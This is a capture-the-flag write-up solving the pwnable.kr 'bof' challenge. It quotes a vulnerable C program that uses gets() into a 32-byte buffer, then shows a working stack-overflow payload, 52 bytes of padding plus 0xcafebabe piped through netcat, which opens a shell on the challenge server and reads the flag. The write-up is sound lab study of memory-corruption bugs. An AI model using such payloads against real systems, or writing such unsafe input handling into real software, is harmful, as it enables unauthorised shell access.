"Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download: http://pwnable.kr/bin/bof

Download: http://pwnable.kr/bin/bof.c

Running at: nc pwnable.kr 9000"

Buffer overflow? [this video](https://youtu.be/1S0aBV-Waeo?si=V6Bp8g2lC54MpeAM) and [this article](https://owasp.org/www-community/attacks/Buffer_overflow_attack) will tell you perfectly all you need for the challenge.
It seems like as we do netcat bof file gets executed and we need to overflow it:
```bash
└──╼ $nc pwnable.kr 9000
aaaaaaaaaaaaaaaaaaaaaaaaa
overflow me : 
Nah..
```
Let's take a look at the source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
So the code basically compares different values but before that create a buf, in that way we can exploit the program and overwrite the values in a way that they'll be equal.
You probably thinking "Oh, we just need to fill 32 bytes (the buf) and afterwards just enter the hex value, right?"

![giphy](https://github.com/ido5ch/Pwnable.kr/assets/97401114/fc502fc6-bba0-4049-b218-1842ef1158a3)

```bash
└──╼ $python2 -c 'print "a" * 32 + "\xbe\xba\xfe\xca"'| nc pwnable.kr 9000
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 
Nah..
```
That's odd. I opened ida and just tried to figure out how many bytes are there between the parameter of the function and its comparison. 
After a few minutes I found out it was 52 bytes, let's try it out:
```bash
└──╼ $python2 -c 'print "a" * 52 + "\xbe\xba\xfe\xca"'| nc pwnable.kr 9000
ls

vbfsb
^C
```
It looks like it worked and immediately logged out of the shell. Let's add brackets and cat (nothing):
```bash
(python2 -c 'print "a" * 52 + "\xbe\xba\xfe\xca"'; cat)| nc pwnable.kr 9000
ls
bof
bof.c
flag
log
super.pl
cat flag
*the flag*
```
But Ido... why is the script in Python 2 and not in Python 3? [well...](http://python3porting.com/problems.html#bytes-strings-and-unicode)
